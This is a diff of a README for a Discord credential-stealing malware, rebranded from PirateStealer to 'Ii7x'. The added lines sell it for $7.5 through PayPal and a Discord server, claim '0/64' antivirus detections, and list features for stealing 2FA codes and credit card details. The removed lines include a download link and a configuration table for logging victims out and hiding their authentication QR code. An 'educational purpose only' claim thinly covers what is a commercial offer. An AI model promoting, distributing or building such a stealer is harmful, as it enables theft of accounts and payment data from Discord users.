@@ -1,34 +1,27 @@
-#### ⚠️ Proof Of Concept && Educational Purpose Only ⚠️
+![image](https://user-images.githubusercontent.com/95602963/144788455-62e3307b-2f30-4ae4-a7d6-f525d309edbb.png)
+![image](https://user-images.githubusercontent.com/95602963/144790135-a2908c2b-4ccb-490d-ac4b-69b3a7d08d10.png) ![image](https://user-images.githubusercontent.com/95602963/144788469-52ae8885-b705-44a0-b3ab-312f3b0342cb.png) ![image](https://user-images.githubusercontent.com/95602963/144790207-ec786a50-051b-4436-bd01-1648a169bd91.png) ![image](https://user-images.githubusercontent.com/95602963/144790229-2c5b422c-9dc7-4f0a-b75c-348ef3ca3682.png) ![image](https://user-images.githubusercontent.com/95602963/144790265-e3bc5c9e-12da-479c-9b44-24faf61c0290.png)
+https://cdn.discordapp.com/attachments/917300986769440818/917307092849791046/bandicam_2021-12-06_00-00-00-565.mp4
 
-## Click here [Download](https://github.com/PirateStealer-GF/PirateStealer/archive/refs/heads/main.zip) (Undected as of now)
+## Only for 7.5$  Send, and DM ME Give me a screenshot
+## Paypal: https://www.paypal.com/paypalme/Talaloq
+## Discord: https://discord.gg/rtQHekszYA
 
-# PirateStealer 
+# Ii7x
+Official Ii7x repos
 
+# What is Ii7x ? 
+Ii7x is an educational purpose only open-source Discord Malware. With an easy to build panel and a "premium" feature (Join Discord for more infos) 
 
-## Read this please
-I'm not the original owner of this repository
-
-As you may know stanley deleted all of his repositories since he don't want to be associated with malware developpement anymore, as you can see he transfered ownership to me but what does that mean ? 
-
-I will try to update PirateStealer, but take into account that I don't have that much free time to work on it due to college stuff bla-bla...
-
-### You were targeted by this malware
-Sorry but don't come at me since I'm not responsible of what people do with this repo.
-
-Check these repos: 
-- [Asabira](https://www.youtube.com/channel/UCFOAiW3kPYAjZlNn73bJYlA) (Work in Progress atm)
-- [DC-Malware-Detector](https://www.youtube.com/channel/UCFOAiW3kPYAjZlNn73bJYlA)
-
-## Official PirateStealer repository
-
-![](https://media.discordapp.net/attachments/877960059781529710/878229324262699089/PirateMonster-removebg-preview_3.png)
-
-### Login
-![Login](https://media.discordapp.net/attachments/870608841623085100/901462244527861800/unknown.png?width=454&height=616)
-### Changed Password
-![Password](https://media.discordapp.net/attachments/870608841623085100/901462254875193414/unknown.png?width=517&height=616)
+# Terms
+- [x] You only use it for educational or private purposes.
+- [x] Reselling is forbidden.
+- [x] Stole the project (Saying you made it etc) is forbidden.
+- [x] We can change terms when we want to.
 
 # Features
+- 2FA Codes
+- Low Detections (0/64)
+- Configuration System
 - Log all friends owning a "rare" badge
 - Discord Credit Card Stealing
     - Credit Card Number
@@ -75,23 +68,3 @@ Check these repos:
 - IP
 - Remove QR Code
 - BetterDiscord Protection Remover
-
-# Configuration
-|            Name | Description                                                                                                                                          | Example     | Type    |
-|----------------:|------------------------------------------------------------------------------------------------------------------------------------------------------|-------------|---------|
-| platform        | An array containing all the platforms you want your grabber to work on.                                                                              | ["windows"] | array   |
-| logout          | False: Do not log out delayed: Disconnect the next time you launch Discord Instant: Kill Discord and ask to reconnect                                   | "instant"   | boolean |
-| inject-notify   | False: Does not send a message when the grabber has successfully injected True: Send a message when the grabber has successfully injected            | "true"      | boolean |
-| logout-notify   | False: Does not send a message when the victim has successfully logged out True: Send a message when the victim has successfully logged out          | "false"     | boolean |
-| init-notify     | False: Does not send a message when the grabber has been initialized in the victim discord client True: Send the message                             | "false"     | boolean |
-| embed-color     | The embed color in decimal!                                                                                                                              | "3447704"   | string  |
-| disable-qr-code | False: The victim will have access to the authentication QRCode (not recommended) True: The victim will not have access to the authentication QRCode | "true"      | boolean |
-
-
-
-# Contributors
-| Name    | Github                              | Contribute   |
-|---------|----------------------------|--------------|
-| JustSvK | https://github.com/PirateStealer-GF | C++ Injector |
-|         |                                     |              |
-|         |                                     |              |
